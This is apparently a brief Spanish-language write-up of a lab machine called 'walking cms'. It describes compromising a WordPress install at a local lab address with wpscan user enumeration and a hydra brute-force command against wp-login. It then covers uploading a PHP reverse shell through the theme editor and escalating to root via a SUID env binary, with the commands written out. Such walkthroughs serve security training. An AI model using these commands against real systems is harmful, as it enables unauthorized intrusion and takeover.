# walking cms

con gobuster enumerando directorios nos damos cuenta de que estamos ante un wordpress

posteriormenete con wpscan hacemos un escaner de la pagina

```
wpscan --url http://172.17.0.2/wordpress/ -e u
```

esto nos enumera al usaurio mario

con hydra haciendo fuerza bruta sacamos la contraseña para averigurar que la contraseña era love

```
hydra -l mario -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 172.17.0.2 http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302'
```

posteriormente en uno de los comandos los temas nos dejaba cambiarlo ==twentytwentytwo==

ahi subimos una reverse shell de php de pentest monkey

```
http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php
```

y finalmente accedemos como el usuario www-data

para escalar privilegios nos deja hacer

```
find / -perm -4000 2>/dev/null
```

que lo utilizamos para ver que el comando env tiene permiso suid

```
./env /bin/sh -p
```

y con esto ganamos acceso al sistema como root
